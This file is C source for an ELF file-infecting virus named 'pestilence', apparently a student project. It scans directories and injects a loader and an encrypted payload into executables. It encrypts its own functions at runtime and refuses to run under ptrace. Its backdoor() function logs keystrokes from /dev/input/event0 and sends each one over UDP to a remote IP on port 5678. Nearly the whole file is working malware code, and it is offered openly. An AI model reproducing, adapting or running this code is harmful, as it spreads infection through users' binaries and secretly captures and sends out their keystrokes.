#include "pestilence.h"

static void	init_info(t_info *info, size_t *tab_addr)
{
	info->text_begin = 0;
	info->text_size = 0;
	info->valid_target = 1;
	info->in_pestilence = 0;

	info->tab_addr = tab_addr;
}

static void	inject_payload(t_info *info)
{
	void		*addr;

	addr = &ft_memcpy;
	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
	ft_memcpy(info->file + info->offset_bis + BIS_SIZE, addr, PAYLOAD_SIZE);
 	uint32_t key = decrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], 14);
	patch_payload(info);
 	reencrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], key);
}

static void	inject_loader(t_info *info)
{
	void	*addr;

	addr = &loader;
	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
}

static void	inject_bis(t_info *info)
{
	void		*addr;	

	addr = &syscalls;
	ft_memcpy(info->file + info->offset_bis, addr, BIS_SIZE);
}

static int		reload_mapping(t_info *info)
{
	void	*new;
	size_t	new_size;

	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE + BIS_SIZE;
	if ((new = ft_sysmmap(0, new_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return (1);
	ft_memcpy(new, info->file, info->file_size);
	ft_sysmunmap(info->file, info->file_size);
	info->file = new;
	info->file_size = new_size;
	return (0);
}

static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
{
	uint32_t	magic = MAGIC_VIRUS;
	char		buf[0x40];

	//sign
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, &magic, 4);
	write_sign(buf);
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4, buf, SIGN_SIZE);
	//fingerprint
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4 + SIGN_SIZE, &(fingerprint->fingerprint), 4);
	//index
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 5, &(fingerprint->index), 4);
	return (0);
}

/*
   static void	nice_with_gdb(t_info *info)
   {
   size_t size;

   size = info->file_size - (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
   size = size - info->begin_bss;
   ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
   }
   */

static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
{
	struct stat		st;
	uint32_t		magic;

	
	if ((info->fd = ft_sysopen(path, O_RDWR)) < 0)
		return ;
	info->valid_target = 1;
	ft_sysfstat(info->fd, &st);
	info->file_size = st.st_size;
	if ((info->file_size > 50*1024*1024) || info->file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
		goto end_close;
	if ((info->file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, info->fd, 0)) == MAP_FAILED)
		goto end_close;
	if ((magic = *((uint32_t *)(info->file))) != 0x464C457F)
		goto end_fct;
	uint32_t key = decrypt_func(info, &pe_parsing, info->tab_addr[10] - info->tab_addr[9], 9);
	int ret = pe_parsing(info);
	reencrypt_func(info, &pe_parsing, info->tab_addr[10] - info->tab_addr[9], key);
	if (ret == 1)
		goto end_fct;
	key = decrypt_func(info, &reload_mapping, info->tab_addr[25] - info->tab_addr[24], 24);
	ret = reload_mapping(info);
	reencrypt_func(info, &reload_mapping, info->tab_addr[25] - info->tab_addr[24], key);
	if (ret == 1)
		goto end_fct;
	key =  decrypt_func(info, &find_text, info->tab_addr[6] - info->tab_addr[5], 5);
	ret = find_text(info, fingerprint);
	reencrypt_func(info, &find_text, info->tab_addr[6] - info->tab_addr[5], key);
	if (ret == 1)
		goto end_fct;
	inject_loader(info);
	inject_payload(info);
	inject_bis(info);
	key = decrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], 8);
	epo_parsing(info);
	reencrypt_func(info, &epo_parsing, info->tab_addr[9] - info->tab_addr[8], key);
	if (info->valid_target == 0)
		goto end_fct;
	key = decrypt_func(info, &patch_addresses, info->tab_addr[17] - info->tab_addr[16], 16);
	patch_addresses(info);
	reencrypt_func(info, &patch_addresses, info->tab_addr[17] - info->tab_addr[16], key);
	key = decrypt_func(info, &inject_sign, info->tab_addr[26] - info->tab_addr[25], 25);
	inject_sign(info, fingerprint);
	reencrypt_func(info, &inject_sign, info->tab_addr[26] - info->tab_addr[25], key);
	crypt_payload(info, fingerprint->fingerprint);
	patch_key(info, encrypt(info, info->file + info->offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
	ft_syswrite(info->fd, info->file, info->file_size);
end_fct:
	ft_sysmunmap(info->file, info->file_size);
end_close:
	ft_sysclose(info->fd);
	return ;
}

static int	get_index_file(char *path)
{
	struct stat	st;
	int		fd;
	uint32_t	magic, index;
	size_t		file_size;
	void		*file;
	Elf64_Ehdr	*main_header;
	Elf64_Phdr	*header;
	size_t		base_entry;
	int32_t		i;
	void		*addr_magic;

	index = 0;
	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
		return 0;
	ft_sysfstat(fd, &st);
	file_size = st.st_size;
	if ((file_size > 60*1024*1024) || file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
		goto end_close;
	if ((file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto end_close;
	if ((magic = *((uint32_t *)(file))) != 0x464C457F)
		goto end_fct;
	main_header = (Elf64_Ehdr *)(file);
	base_entry = main_header->e_entry;
	i = 0;
	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
	if (file_size < main_header->e_shoff + (main_header->e_shnum * sizeof(Elf64_Shdr)))
		goto end_fct;
	while (i < main_header->e_phnum)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			addr_magic = file + header->p_offset + header->p_filesz - SIGN_SIZE - 8;
			magic = *((uint32_t *)(addr_magic));
			if (magic == MAGIC_VIRUS)
			{
				index = (*((uint32_t *)(addr_magic - 5)));
				goto end_fct;
			}
		}
		header++;
		i++;
	}
end_fct:
	ft_sysmunmap(file, file_size);
end_close:
	ft_sysclose(fd);
	return index;
}

static int	file_path(char *path, t_fingerprint *fingerprint, char choice, t_info *info)
{
	char			buf_d[1024];
	struct linux_dirent64	*dir;
	int			fd, n_read, pos;
	uint32_t		index, tmp_index;
	char			buf_path_file[PATH_MAX];

	index = 0;
	n_read = 0;
	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
		return (1);
	while ((n_read = ft_sysgetdents(fd, buf_d, 1024)) > 0)
	{
		for (pos = 0; pos < n_read;)
		{
			dir = (struct linux_dirent64 *)(buf_d + pos);
			if (dir->d_type == 8) //dt_reg
			{
				if (choice == 1)
				{	//get highest index
					fingerprint->fingerprint += 1;
					ft_memcpy(buf_path_file, path, PATH_MAX);
					ft_strcat(buf_path_file, dir->d_name);
					uint32_t key = decrypt_func(info, &get_index_file, info->tab_addr[28] - info->tab_addr[27], 27);
					tmp_index = get_index_file(buf_path_file);
					reencrypt_func(info, &get_index_file, info->tab_addr[28] - info->tab_addr[27], key);
					if (tmp_index > index)
						index = tmp_index;
				} else
				{	//infect dir
					ft_memcpy(buf_path_file, path, PATH_MAX);
					ft_strcat(buf_path_file, dir->d_name);
					uint32_t key = decrypt_func(info, &infect_file, info->tab_addr[27] - info->tab_addr[26], 26);
					infect_file(buf_path_file, fingerprint, info);
					reencrypt_func(info, &infect_file, info->tab_addr[27] - info->tab_addr[26], key);
					fingerprint->fingerprint -= 1;
				}
			}
			pos += dir->d_reclen;
		}
	}
	ft_sysclose(fd);
	return (index);
}


static void	close_entries(void)
{
	double_ret();
	uint32_t	addr_origin;
	void		*addr;
	void		*addr_hook;

	addr = get_rip();
	mprotect_text(PROT_WRITE | PROT_READ | PROT_EXEC);
	addr_origin = -1;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -2;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -3;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -4;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -5;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);
}

void		fill_tab_addr(size_t *tab_addr)
{
	//parsing.c
	tab_addr[0] = (size_t)&update_index;
	tab_addr[1] = (size_t)&check_magic;
	tab_addr[2] = (size_t)&get_padding_size;
	tab_addr[3] = (size_t)&valid_call;
	tab_addr[4] = (size_t)&patch_sections_header;
	tab_addr[5] = (size_t)&find_text;
	tab_addr[6] = (size_t)&hook_call;
	tab_addr[7] = (size_t)&patch_close_entries;
	tab_addr[8] = (size_t)&epo_parsing;
	tab_addr[9] = (size_t)&pe_parsing;
	tab_addr[10] = (size_t)&parse_process;
	tab_addr[11] = (size_t)&check_process;

	//utils.c
	tab_addr[12] = (size_t)&itoa;

	//patch.c
	tab_addr[13] = (size_t)&patch_loader;
	tab_addr[14] = (size_t)&patch_payload;
	tab_addr[15] = (size_t)&patch_bis;
	tab_addr[16] = (size_t)&patch_addresses;
	
	//check_ownfile.c
	tab_addr[17] = (size_t)&get_path_own_file;
	tab_addr[18] = (size_t)&rewrite_own_file;
	tab_addr[19] = (size_t)&update_own_index;

	//pestilence.c
	tab_addr[20] = (size_t)&init_info; //jump
	tab_addr[21] = (size_t)&inject_payload;
	tab_addr[22] = (size_t)&inject_loader;
	tab_addr[23] = (size_t)&inject_bis;
	tab_addr[24] = (size_t)&reload_mapping;
	tab_addr[25] = (size_t)&inject_sign;
	tab_addr[26] = (size_t)&infect_file;
	tab_addr[27] = (size_t)&get_index_file;
	tab_addr[28] = (size_t)&file_path;
	tab_addr[29] = (size_t)&close_entries;
	tab_addr[30] = (size_t)&fill_tab_addr;
}

uint16_t	my_htons(uint16_t x)
{
	return ((((x) >> 8) & 0xff) | (((x) & 0xff) << 8));
}
uint32_t	my_htonl(uint32_t x)
{
	return ((((x) & 0xff000000u) >> 24) | (((x) & 0x00ff0000u) >> 8) | (((x) & 0x0000ff00u) << 8| (((x) & 0x000000ffu) << 24)));
}

int	my_inet_aton(char *cp, struct in_addr *ap)
{
	int dots = 0;
	register u_long acc = 0, addr = 0;
	do {
		register char cc = *cp;
		if (cc == '0' || cc == '1' || cc == '2' || cc == '3' || cc == '4' || cc == '5' || cc == '6' || cc == '7' || cc == '8' || cc == '9')
		{
			acc = acc * 10 + (cc - '0');
		}
		else if (cc == '.')
		{
			if (++dots > 3) {
				return 0;
			}
			if (acc > 255) {
				return 0;
			}
			addr = addr << 8 | acc;
			acc = 0;
		}
		else if (cc == '\0')
		{
			if (acc > 255) {
				return 0;
			}
			addr = addr << 8 | acc;
			acc = 0;
			break;
		}
		else
		{
			return (0);
			}
	} while (*cp++);
	if (dots < 3) {
		addr <<= 8 * (3 - dots) ;
	}
	if (ap) {
		ap->s_addr = my_htonl(addr);
	}
	return 1;
}

static void	backdoor()
{
	pid_t pid = ft_sysfork();
	
	if (pid == -1)
		return ;
	if (pid == 0)
	{
		int fd;
		int sock;
		struct sockaddr_in struct_addr_in;
		socklen_t len_struct;
		struct input_event ev;
		char buf[0x40];// = "/dev/input/event0";
// 		char *str2 ="10.12.10.8"; 
		write_event0(buf);
		fd = ft_sysopen(buf, O_RDONLY);
		if (fd < 0)
			ft_sysexit(0);
		ft_syswrite(1, buf, 10);
		sock = ft_syssocket(AF_INET, SOCK_DGRAM, 0);
		if (sock < 0)
		{
			ft_sysclose(fd);
			ft_sysexit(0);
		}
		len_struct = sizeof(struct_addr_in);
		ft_memset(&struct_addr_in, 0, len_struct);
		struct_addr_in.sin_family = AF_INET;
		struct_addr_in.sin_port = my_htons(5678);
		write_ip(buf);
		my_inet_aton(buf, &struct_addr_in.sin_addr);
		while (1)
		{
			ft_sysread(fd, &ev, sizeof(struct input_event));
			if (ev.type == EV_KEY && ev.value == 0x1)
			{
				if (ft_syssendto(sock, &(ev.code), 2, 0, (struct sockaddr *)&struct_addr_in, len_struct) < 0)
					ft_sysexit(0);
			}
		}


	}
	else
		return ;
}

int		main(void)
{
	size_t			tab_addr[31];
	char			buf[BUF_SIZE];
	char			buf_path[PATH_MAX];
	uint32_t		tmp_index;
	t_fingerprint		fingerprint;
	t_info			info;

	if (ft_sysptrace(0, 0, 1, 0) == -1)
		return (0);
	fill_tab_addr(tab_addr);
	init_info(&info, tab_addr);
	info.in_pestilence = 1;
	close_entries();
	write_proc(buf_path);

	uint32_t key = decrypt_func(&info, &check_process, info.tab_addr[12] - info.tab_addr[11], 11);
	int ret = check_process(buf_path, &info);
	if (ret == 1)
		return (0);
	if (info.in_pestilence == 0)
		backdoor();
	reencrypt_func(&info, &check_process, info.tab_addr[12] - info.tab_addr[11], key);
	write_begin(buf);
	ft_syswrite(1, buf, 8);
	write_test2(buf_path);
	fingerprint.fingerprint = 0;
	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
	tmp_index = file_path(buf_path, &fingerprint, 1, &info);
	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
	write_test(buf_path);
	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
	fingerprint.index = file_path(buf_path, &fingerprint, 1, &info);
	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
	if (tmp_index > fingerprint.index)
		fingerprint.index = tmp_index;
	key = decrypt_func(&info, &update_own_index, info.tab_addr[20] - info.tab_addr[19], 19);
	update_own_index(&fingerprint, &info); // update fingerprint.index and update own exec
	reencrypt_func(&info, &update_own_index, info.tab_addr[20] - info.tab_addr[19], key);
	fingerprint.index += fingerprint.fingerprint;
	fingerprint.fingerprint = fingerprint.index;
	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
	file_path(buf_path, &fingerprint, 0, &info);
	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
	write_test2(buf_path);
	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
	file_path(buf_path, &fingerprint, 0, &info);
	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
	return (0);
}
